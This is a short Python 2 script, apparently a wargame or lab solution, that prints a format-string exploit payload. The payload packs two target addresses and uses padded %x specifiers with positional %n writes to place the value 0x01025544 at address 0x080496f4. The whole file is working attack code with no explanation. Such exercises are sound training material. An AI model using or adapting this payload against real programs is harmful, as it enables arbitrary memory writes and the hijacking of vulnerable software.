#!/usr/bin/env python
import struct

#hit->0x01025544
#offset->12
target1=struct.pack("I", 0x080496f4)
target2=struct.pack("I", 0x080496f4+2)

s=""
s+=target1
s+=target2
s+="%21820x"
s+="%12$n"
s+="%43966x"
s+="%13$n"
print s
